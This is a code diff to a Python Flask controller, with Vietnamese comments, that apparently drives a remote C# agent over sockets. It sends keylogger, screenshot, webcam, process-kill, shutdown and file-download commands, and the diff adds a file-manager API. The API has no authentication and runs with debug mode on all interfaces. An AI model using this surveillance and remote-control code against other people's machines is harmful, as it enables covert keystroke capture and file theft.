@@ -41,139 +41,148 @@ def send_command_to_server(command_type, sub_command=None, args=None):
     client = None
 
     try:
-        # 1. Tạo kết nối
+        # 1. Kết nối Socket
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.settimeout(10)
         client.connect((HOST, PORT))
         writer = client.makefile('w', encoding='utf-8', newline='\r\n')
-        
-        # --- QUAN TRỌNG: XÓA DÒNG writer.write(f"{command_type}\n") Ở ĐÂY ---
-        # Chúng ta sẽ gửi lệnh cụ thể bên trong từng block if/elif để chính xác tuyệt đối.
+        reader = client.makefile('r', encoding='utf-8', newline='\r\n')
 
-        # 2. Xử lý logic từng nhóm lệnh
-        
-        # === NHÓM 1: QUẢN LÝ TIẾN TRÌNH & ỨNG DỤNG ===
-        if command_type in ["PROCESS", "APPLICATION"]:
-            # Gửi Header để C# biết phải vào hàm process() hay application()
+        # --- KHÔNG CÒN GỬI LỆNH TỰ ĐỘNG Ở ĐÂY NỮA ---
+        # Mỗi "if" bên dưới sẽ tự quyết định gửi gì.
+
+        # === NHÓM 1: CÁC MODULE CŨ (Cần gửi Header trước) ===
+        if command_type in ["PROCESS", "APPLICATION", "KEYLOG", "TAKEPIC", "SHUTDOWN", "RESTART"]:
+            # Tự gửi Header của chính mình
             writer.write(f"{command_type}\n") 
             writer.flush()
-            
-            reader = client.makefile('r', encoding='utf-8', newline='\r\n')
-            
-            if sub_command == "XEM": 
-                writer.write("XEM\n")
-                writer.flush()
-                try:
-                    line = reader.readline()
-                    if line:
-                        count = int(line.strip())
-                        data_list = []
-                        for _ in range(count):
-                            p_name = reader.readline().strip()
-                            p_id = reader.readline().strip()
-                            p_threads = reader.readline().strip()
-                            data_list.append({"name": p_name, "id": p_id, "threads": p_threads})
-                        response_data = data_list
+
+            # --- Logic bên trong giữ nguyên ---
+            if command_type == "TAKEPIC":
+                client.sendall(b"TAKE\n")
+                # (Logic đọc ảnh giữ nguyên...)
+                size_buffer = b""
+                while True:
+                    char = client.recv(1)
+                    if char == b'\n' or not char: break
+                    size_buffer += char
+                size_str = size_buffer.decode('utf-8').strip()
+                if size_str.isdigit() and int(size_str) > 0:
+                    img_data = recvall(client, int(size_str))
+                    if img_data:
+                        response_data = base64.b64encode(img_data).decode('utf-8')
                         status = "success"
-                except Exception as e:
-                    msg = f"Read error: {str(e)}"
+                client.sendall(b"QUIT\n")
 
-            elif sub_command in ["KILL", "START"]:
-                writer.write(f"{sub_command}\n")
-                writer.write(f"{sub_command}ID\n")
-                
-                final_args = args
-                if sub_command == "START" and args:
-                    lower_arg = args.lower()
-                    if lower_arg in APP_ALIASES:
-                        final_args = APP_ALIASES[lower_arg]
-                
-                writer.write(f"{final_args}\n") 
-                writer.flush()
-                
-                result = reader.readline()
-                if result:
-                    status = "success" if "Successfully" in result else "error"
-                    msg = result.strip()
-            
-            writer.write("QUIT\n")
-            writer.flush()
-
-        # === NHÓM 2: CHỤP ẢNH ===
-        elif command_type == "TAKEPIC":
-            writer.write("TAKEPIC\n") # Gửi Header
-            writer.flush()
-            
-            client.sendall(b"TAKE\n")
-            
-            # Logic đọc ảnh giữ nguyên
-            size_buffer = b""
-            while True:
-                char = client.recv(1)
-                if char == b'\n' or not char: break
-                size_buffer += char
-            
-            size_str = size_buffer.decode('utf-8').strip()
-            if size_str.isdigit() and int(size_str) > 0:
-                img_data = recvall(client, int(size_str))
-                if img_data:
-                    response_data = base64.b64encode(img_data).decode('utf-8')
-                    status = "success"
-            client.sendall(b"QUIT\n")
-
-        # === NHÓM 3: KEYLOGGER ===
-        elif command_type == "KEYLOG":
-            writer.write("KEYLOG\n") # Gửi Header
-            writer.flush()
-            
-            reader = client.makefile('r', encoding='utf-8', newline='\r\n')
-            if sub_command == "PRINT":
-                writer.write("PRINT\n")
-                writer.flush()
-                response_data = reader.readline().strip()
+            elif command_type in ["SHUTDOWN", "RESTART"]:
                 status = "success"
-            elif sub_command in ["HOOK", "UNHOOK", "CLEAR", "STATUS"]:
-                writer.write(f"{sub_command}\n")
-                writer.flush()
-                if sub_command == "STATUS":
+                msg = f"Sent {command_type}"
+
+            elif command_type == "KEYLOG":
+                if sub_command == "PRINT":
+                    writer.write("PRINT\n")
+                    writer.flush()
                     response_data = reader.readline().strip()
-                elif sub_command == "CLEAR":
-                    msg = reader.readline().strip()
-                else:
-                    msg = f"Keylogger {sub_command}"
-                status = "success"
+                    status = "success"
+                elif sub_command in ["HOOK", "UNHOOK", "CLEAR", "STATUS"]:
+                    writer.write(f"{sub_command}\n")
+                    writer.flush()
+                    if sub_command == "STATUS": response_data = reader.readline().strip()
+                    elif sub_command == "CLEAR": msg = reader.readline().strip()
+                    status = "success"
+                writer.write("QUIT\n")
+                writer.flush()
 
-            writer.write("QUIT\n")
-            writer.flush()
+            elif command_type in ["PROCESS", "APPLICATION"]:
+                if sub_command == "XEM":
+                    writer.write("XEM\n")
+                    writer.flush()
+                    try:
+                        line = reader.readline()
+                        if line:
+                            count = int(line.strip())
+                            data_list = []
+                            for _ in range(count):
+                                p_name = reader.readline().strip()
+                                p_id = reader.readline().strip()
+                                p_threads = reader.readline().strip()
+                                data_list.append({"name": p_name, "id": p_id, "threads": p_threads})
+                            response_data = data_list
+                            status = "success"
+                    except: msg = "Lỗi đọc dữ liệu Process"
+                
+                elif sub_command in ["KILL", "START"]:
+                    writer.write(f"{sub_command}\n")
+                    writer.write(f"{sub_command}ID\n")
+                    # Xử lý args
+                    final_args = args
+                    if sub_command == "START" and args:
+                        if args.lower() in APP_ALIASES: final_args = APP_ALIASES[args.lower()]
+                    writer.write(f"{final_args}\n")
+                    writer.flush()
+                    
+                    res = reader.readline()
+                    status = "success" if "Successfully" in res else "error"
+                    msg = res.strip()
+                
+                writer.write("QUIT\n")
+                writer.flush()
 
-        # === NHÓM 4: WEBCAM (SỬA ĐỔI QUAN TRỌNG) ===
+        # === NHÓM 2: WEBCAM (Gửi lệnh trực tiếp, KHÔNG gửi Header 'WEBCAM') ===
         elif command_type == "WEBCAM":
-            # KHÔNG gửi chữ "WEBCAM".
-            # Chỉ gửi thẳng lệnh con: "WEBCAM_START", "WEBCAM_STOP"...
-            # Lý do: Bên C# switch(s) bắt trực tiếp các string này.
-            writer.write(f"{sub_command}\n") 
+            # Gửi thẳng sub_command (ví dụ: WEBCAM_START)
+            writer.write(f"{sub_command}\n")
             writer.flush()
             
-            # Đọc phản hồi xác nhận từ Server
-            reader = client.makefile('r', encoding='utf-8', newline='\r\n')
-            response_msg = reader.readline().strip()
-            msg = response_msg
+            # Đọc phản hồi
+            resp = reader.readline().strip()
+            msg = resp
             status = "success"
             
-            # Không cần gửi QUIT ở đây vì C# xử lý lệnh Webcam xong sẽ tiếp tục lắng nghe vòng lặp
-            # Nhưng để an toàn ngắt kết nối socket này:
             writer.write("QUIT\n")
             writer.flush()
 
-        # === NHÓM 5: NGUỒN ===
-        elif command_type in ["SHUTDOWN", "RESTART"]:
-            writer.write(f"{command_type}\n") # Gửi thẳng lệnh
+        # === NHÓM 3: FILE MANAGER (Gửi lệnh trực tiếp, KHÔNG gửi Header 'FILE') ===
+        elif command_type == "FILE":
+            if sub_command == "GET_FILES":
+                writer.write("GET_FILES\n") # Gửi thẳng lệnh này sang C#
+                writer.flush()
+                
+                count_str = reader.readline().strip()
+                if count_str.isdigit():
+                    count = int(count_str)
+                    file_list = []
+                    for _ in range(count):
+                        f_name = reader.readline().strip()
+                        f_size = reader.readline().strip()
+                        try:
+                            s = int(f_size)
+                            sz = f"{s/1024/1024:.2f} MB" if s > 1024*1024 else f"{s/1024:.2f} KB"
+                        except: sz = "Unknown"
+                        file_list.append({"name": f_name, "size": sz})
+                    response_data = file_list
+                    status = "success"
+                else: msg = "Lỗi: " + count_str
+
+            elif sub_command == "DOWNLOAD":
+                writer.write("DOWNLOAD_FILE\n") # Gửi thẳng lệnh này sang C#
+                writer.write(f"{args}\n")       # Gửi tên file
+                writer.flush()
+                
+                size_str = reader.readline().strip()
+                if size_str.isdigit() and int(size_str) > 0:
+                    f_data = recvall(client, int(size_str))
+                    if f_data:
+                        response_data = base64.b64encode(f_data).decode('utf-8')
+                        status = "success"
+                    else: msg = "Lỗi tải dữ liệu"
+                else: msg = "File không tồn tại"
+
+            writer.write("QUIT\n") # Ngắt kết nối socket này
             writer.flush()
-            status = "success"
-            msg = f"Sent {command_type} command."
 
     except Exception as e:
-        msg = f"Server Error: {str(e)}"
+        msg = f"Lỗi Server: {str(e)}"
     finally:
         if client: client.close()
 
@@ -260,6 +269,15 @@ def webcam_control():
     # Gửi lệnh sang Port 5656 (như các lệnh khác)
     action = request.json.get('action') 
     return jsonify(send_command_to_server("WEBCAM", action))
+
+# 4. API Quản lý file
+@app.route('/api/file', methods=['POST'])
+def file_manager():
+    data = request.json
+    action = data.get('action') # GET_FILES hoặc DOWNLOAD
+    filename = data.get('filename') # Chỉ dùng khi DOWNLOAD
+    
+    return jsonify(send_command_to_server("FILE", action, filename))
 if __name__ == '__main__':
     # host='0.0.0.0' cho phép truy cập từ các máy khác trong mạng LAN
     app.run(host='0.0.0.0', debug=True, port=5000)
